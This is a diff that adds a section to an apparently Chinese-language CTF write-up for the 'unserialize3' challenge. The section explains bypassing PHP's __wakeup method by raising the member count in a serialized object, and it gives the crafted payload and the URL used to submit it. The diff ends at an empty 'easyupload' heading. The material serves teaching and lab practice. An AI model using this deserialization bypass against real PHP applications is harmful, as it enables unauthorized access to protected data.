@@ -96,3 +96,50 @@ if($_GET[id] == "admin")
 }
 ?>
 ```
+
+<br>
+
+### unserialize3
+
+目的：通过反序列化绕过魔法函数 wakeup
+
+原理：  
+当执行反序列化时会首先运行魔法函数 `__wakeup()`；我们需要绕过该魔法函数才能正确获取 flag  
+仅需使序列化成员数大于实际成员数即可！
+
+打开 phpstorm，写入以下代码，获取类 xctf 的序列化内容
+
+```php
+<?php
+class xctf
+{
+    public $flag = '111';
+
+    public function __wakeup()
+    {
+        exit('bad requests');
+    }
+}
+
+$a=new xctf();
+var_dump(serialize($a));
+```
+
+<br>
+
+得到的序列化内容：  
+`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`
+
+我们增加实际成员数，即把 1 改成 2，此时得到：  
+`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`
+
+<br>
+
+将该序列化内容作为负载写入 URL  
+`xxx.xxx.xxx.xxx/index.php?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}`
+
+即可绕过 wakeup 获取正确的 flag
+
+<br>
+
+### easyupload
